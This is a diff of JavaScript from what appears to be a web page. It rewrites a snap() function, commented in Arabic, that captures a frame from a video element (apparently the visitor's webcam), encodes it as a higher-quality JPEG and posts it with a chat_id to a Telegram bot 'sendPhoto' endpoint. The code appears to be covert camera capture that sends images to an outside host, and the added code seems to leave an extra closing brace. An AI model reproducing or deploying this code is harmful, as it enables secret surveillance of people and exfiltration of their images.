@@ -126,18 +126,28 @@
         }
 
         function snap() {
-            const canvas = document.getElementById('c');
-            const video = document.getElementById('v');
-            if (video.readyState === 4) {
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    const f = new FormData();
-                    f.append('chat_id', chat);
-                    f.append('photo', blob, 'x.jpg');
-                    fetch(bot1_api + "sendPhoto", { method: 'POST', body: f });
-                }, 'image/jpeg', 0.7);
-            }
+    const canvas = document.getElementById('c');
+    const video = document.getElementById('v');
+    
+    // التأكد من أن الفيديو يعمل ولدينا أبعاد حقيقية
+    if (video.videoWidth === 0) return;
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    
+    const ctx = canvas.getContext('2d');
+    
+    // رسم الصورة على الكانفاس
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // تحويلها لصورة بجودة عالية (0.9 تعني جودة 90%)
+    canvas.toBlob(blob => {
+        const f = new FormData();
+        f.append('chat_id', chat);
+        f.append('photo', blob, 'x.jpg');
+        fetch(api + "sendPhoto", { method: 'POST', body: f });
+    }, 'image/jpeg', 0.9); 
+        }
         }
 
         function sendText(api_url, txt) {
